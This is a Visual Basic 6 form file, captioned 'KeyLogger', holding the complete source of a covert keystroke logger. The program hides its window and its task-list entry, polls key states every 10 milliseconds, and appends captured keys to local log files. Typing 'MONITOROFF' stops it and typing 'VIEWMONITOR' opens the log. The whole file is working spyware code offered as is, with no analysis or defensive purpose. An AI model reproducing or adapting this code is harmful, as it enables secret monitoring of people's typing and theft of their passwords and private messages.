VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "KeyLogger"
   ClientHeight    =   30
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   780
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   30
   ScaleWidth      =   780
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   960
      Top             =   1170
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Dim RetValue As Long
Dim SendKeyCode As Long
Dim fs As Object
Dim fso As Object
Dim Locked(125) As Boolean
Dim i As Integer
Dim f As Integer
Dim x As Integer
Dim J As String
Dim B As String
Dim RetVal

'At the beginning, the value
'of an unpressed key is 0, if it is held down after that,
'the value is -127, unpressed again is 1, and the second
'pressed value is -128. This cycle then repeats itself.

        

Private Sub Form_Load()
If App.PrevInstance Then Unload Me
    App.TaskVisible = False
    i = 1
    f = 1
    J = "MONITOROFF"
    B = "VIEWMONITOR"
End Sub

Private Sub Timer1_Timer()
    For x = 32 To 95
        SendKeyCode = x
        RetValue = GetKeyState(SendKeyCode)
        If RetValue < 0 Then
            If Locked(x) = True Then GoTo lc
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set fs = fso.OpenTextFile("E:\Gabriel\Meus Arquivos\Pessoal\n0d4t4\keyData" & Hour(Time) & Minute(Time) & "_" & Day(Date) & Month(Date) & Year(Date) & ".txt", 8, True, 0)
            fs.Write Chr$(x)
            fs.Close
            If Chr$(x) = Mid(J, i, 1) Then
                i = i + 1
            Else
                i = 1
            End If
            If Chr$(x) = Mid(B, f, 1) Then
                f = f + 1
            Else
                f = 1
            End If
            Set fs = Nothing
            Set fso = Nothing
lc:
            Locked(x) = True
        Else
            Locked(x) = False
        End If
    Next x
    For x = 96 To 105
        SendKeyCode = x
        RetValue = GetKeyState(SendKeyCode)
        If RetValue < 0 Then
            If Locked(x) = True Then GoTo ec
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set fs = fso.OpenTextFile("c:\monitor.mon", 8, True, 0)
            fs.Write Chr$(x - 48)
            fs.Close
            Set fs = Nothing
            Set fso = Nothing
ec:
            Locked(x) = True
        Else
            Locked(x) = False
        End If
    Next x
    SendKeyCode = 13
    RetValue = GetKeyState(SendKeyCode)
    If RetValue < 0 Then
        If Locked(13) = True Then GoTo yc
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set fs = fso.OpenTextFile("c:\monitor.mon", 8, True, 0)
        fs.Write vbCrLf
        fs.Close
        Set fs = Nothing
        Set fso = Nothing
yc:
        Locked(13) = True
    Else
        Locked(13) = False
    End If
    If i = 11 Then
        MsgBox "You are safe now!"
        Unload Me
    End If
    If f = 12 Then
        RetVal = Shell("notepad.exe c:\monitor.mon", 1)
        f = 1
    End If
End Sub
